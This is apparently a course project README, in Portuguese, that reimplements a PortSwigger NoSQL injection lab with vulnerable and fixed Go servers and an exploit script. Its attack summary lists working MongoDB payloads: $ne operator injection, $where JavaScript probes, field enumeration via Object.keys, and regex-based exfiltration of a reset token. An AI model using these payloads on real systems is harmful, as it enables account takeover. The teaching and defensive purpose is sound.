# Lab: Exploiting NoSQL operator injection to extract unknown fields

Reprodução didática do laboratório **PRACTITIONER** do PortSwigger Web Security Academy:

> *Exploiting NoSQL operator injection to extract unknown fields* — a busca de usuários é
> feita em MongoDB e é vulnerável a injeção NoSQL. O objetivo é **logar como `carlos`**,
> exfiltrando antes o valor do *password reset token* dele, que fica em um campo de **nome
> desconhecido**.

> **Aviso de escopo.** Este material é para a disciplina de Cibersegurança. O alvo oficial é um
> laboratório hospedado e autorizado pelo PortSwigger; a aplicação local é uma **reimplementação**
> didática, isolada em containers. Não use as técnicas aqui descritas fora de alvos com autorização
> explícita (`$where` permite execução de JavaScript no MongoDB).

> **Nota de manutenção.** Este é um resumo complementar. Para instruções atuais de execução e a organização canônica do projeto, use o [README da raiz](../README.md). Os detalhes do ataque, da prevenção e da execução hospedada estão em [`docs/`](docs/).

---

## Por que existe uma reimplementação

O lab oficial é hospedado, sem código e **expira**. Para ter um artefato **reproduzível**,
reimplementamos fielmente:

- os endpoints e o fluxo (`/login`, `/forgot-password`, `/my-account`);
- as **mensagens de resposta** exatas (`Invalid username or password`,
  `Account locked: please reset your password`, `Invalid token`), que formam o oráculo booleano;
- o **comportamento da conta-alvo** (`carlos` já nasce com token de reset pendente → conta "locked");
- no laboratório hospedado, a mecânica de que **o campo do token só passa a existir após disparar o "esqueci minha senha"**; localmente, esse pedido renova o token que o seed já criou.

Assim, **o mesmo exploit** roda contra o lab ao vivo e contra a versão local.

## Estrutura

```
.
├── cmd/
│   ├── server/          # servidor VULNERÁVEL (usa internal/app/vuln.go)
│   ├── fixed/           # servidor CORRIGIDO (usa internal/app/fixed.go)
│   └── seed/            # popula o MongoDB (wiener e carlos) + schema estrito
├── internal/
│   ├── app/             # handlers HTTP, templates e rotas
│   │   ├── app.go       # Server, rotas, sessão, CSRF, templates
│   │   ├── vuln.go      # login que repassa o JSON cru ao MongoDB  (VULNERÁVEL)
│   │   ├── fixed.go     # login com allowlist + tipos + query tipada (CORRIGIDO)
│   │   ├── forgot.go    # fluxo de reset de senha / validação de token
│   │   └── templates.go # telas em HTML
│   └── db/              # conexão MongoDB + geração de aleatórios
├── exploit/
│   ├── exploit.py       # exfiltração booleana automatizada (Python/requests)
│   └── requirements.txt
├── documentacao/
│   ├── README.md        # este resumo complementar
│   ├── plan.md          # registro de planejamento e decisões
│   └── docs/
│       ├── WRITEUP.md   # passo a passo reproduzível + decisões + perguntas
│       ├── LAB_LIVE.md  # execução real contra o lab do PortSwigger
│       └── PREVENTION.md # como corrigir (allowlist, tipos, query tipada, schema)
├── docker-compose.yml   # mongo + seed + server (vuln) + fixed
├── Dockerfile           # build multi-stage dos 3 binários
└── README.md            # documentação principal e guia de execução
```

## Pré-requisitos

- Docker + Docker Compose
- Python 3 com `requests` (`pip install -r exploit/requirements.txt`)

## Como rodar (reprodução completa)

```bash
# 1) Sobe MongoDB + seed + servidor vulnerável (porta 8080).
#    O perfil "fixed" também sobe o servidor corrigido (porta 8081).
docker compose --profile fixed up --build -d

# 2) Ataca a versão VULNERÁVEL — deve resolver o lab (logar como carlos).
python3 exploit/exploit.py --target http://localhost:8080

# 3) Ataca a versão CORRIGIDA — deve FALHAR já na confirmação da injeção.
python3 exploit/exploit.py --target http://localhost:8081
```

> **Reset do laboratório:** após um solve, o token de `carlos` é limpo e a conta desbloqueia.
> Para voltar ao estado inicial (carlos "locked"), rode novamente o seed:
> `docker compose run --rm seed`

Para atacar o **lab ao vivo** (se sua instância ainda estiver ativa):

```bash
python3 exploit/exploit.py --target https://<SUA-INSTANCIA>.web-security-academy.net --workers 32
```

## Endpoints da reimplementação

| Método | Rota | Papel |
|---|---|---|
| `GET`  | `/login` | página de login |
| `POST` | `/login` | **ponto de injeção** — recebe JSON; repassa cru ao `FindOne` (vuln) |
| `GET`  | `/forgot-password` | formulário; com `?passwordReset=<token>` valida o token |
| `POST` | `/forgot-password` | `username` → solicita e renova o token de reset / token + senhas → troca |
| `GET`  | `/my-account` | prova de sessão autenticada (`Logged in as ...`) |

## Resumo do ataque

1. **Detecção de operador:** `{"username":"carlos","password":{"$ne":"invalid"}}` → `Account locked`.
2. **Detecção de `$where`:** `...,"$where":"0"` → `Invalid...`; `"$where":"1"` → `Account locked`.
3. **Descoberta de campos:** `Object.keys(this)[i].match('^.{pos}char.*')` enumera `_id`,
   `username`, `password`, `email` e **`passwordReset`**.
4. **Exfiltração do token:** `this['passwordReset'].match('^.{pos}char.*')` reconstrói o valor.
5. **Reset + login:** `GET /forgot-password?passwordReset=<token>` → troca de senha → login
   como `carlos`.

Detalhes, fundamentação e perguntas em aberto: [`docs/WRITEUP.md`](docs/WRITEUP.md).
